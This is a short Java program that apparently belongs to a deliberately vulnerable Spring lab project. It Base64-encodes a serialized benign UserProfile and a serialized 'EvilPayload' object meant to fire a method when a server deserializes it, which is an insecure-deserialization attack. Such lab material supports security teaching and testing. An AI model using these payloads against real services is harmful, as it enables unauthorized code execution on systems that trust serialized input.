package com.example.vulnspring.client;

import com.example.vulnspring.model.EvilPayload;
import com.example.vulnspring.model.UserProfile;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class PayloadGenerator {
    public static void main(String[] args) throws IOException {
        UserProfile good = new UserProfile(
                "paulina", 42L, "paulina@example.com", "shouldBeNull", "tokenXYZ");
        System.out.println("=== UserProfile (Base64) ===");
        System.out.println(toBase64(good));


        EvilPayload evil = new EvilPayload(new EvilPayload(), "toString");
        System.out.println("\n=== EvilPayload (Base64) ===");
        System.out.println(toBase64(evil));
    }

    private static String toBase64(Object o) throws IOException {
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos  = new ObjectOutputStream(baos)) {
            oos.writeObject(o);
            oos.flush();
            return Base64.getEncoder().encodeToString(baos.toByteArray());
        }
    }
}
